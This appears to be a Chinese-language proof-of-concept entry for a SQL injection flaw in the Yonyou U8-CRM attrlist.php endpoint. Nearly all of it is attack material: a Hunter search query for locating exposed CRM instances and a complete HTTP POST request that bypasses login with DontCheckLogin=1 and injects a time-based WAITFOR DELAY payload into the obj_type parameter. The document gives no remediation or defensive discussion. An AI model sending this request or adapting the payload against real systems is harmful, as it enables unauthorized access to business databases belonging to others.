# 用友U8-CRM系统接口attrlist存在SQL注入漏洞



## hunter

```yaml
app.name="用友 CRM"
```

## poc

```java
POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
Host: 
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; 

obj_type=1';WAITFOR DELAY '0:0:5'--
```

